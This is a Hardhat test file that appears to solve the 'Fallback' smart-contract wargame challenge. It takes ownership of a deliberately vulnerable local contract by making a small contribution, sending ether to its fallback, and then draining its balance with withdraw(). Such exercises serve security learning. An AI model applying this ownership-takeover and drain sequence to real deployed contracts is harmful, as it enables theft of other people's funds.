import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Fallback } from '../typechain-types';

// Goal: 1. you claim ownership of the contract; 2. you reduce its balance to 0

describe('Fallback', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let fallback: Fallback;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['fallback']);

    const FallbackDeployment: Deployment = await deployments.get('Fallback');
    fallback = await Promise.resolve(ethers.getContractAt('Fallback', FallbackDeployment.address) as Promise<Fallback>);
  });


  it('Takes ownership and drains contract', async () => {
    expect(await ethers.provider.getBalance(fallback.address)).to.equal('0');
    
    await fallback.connect(user1).contribute({value: ethers.utils.parseUnits('5', 14)})

    await user1.sendTransaction({
      to: fallback.address,
      value: ethers.utils.parseUnits('5', 15)
    });

    expect(await ethers.provider.getBalance(fallback.address)).to.equal(ethers.utils.parseUnits('55', 14));

    await fallback.connect(user1).withdraw();
    expect(await ethers.provider.getBalance(fallback.address)).to.equal('0');
  });

});
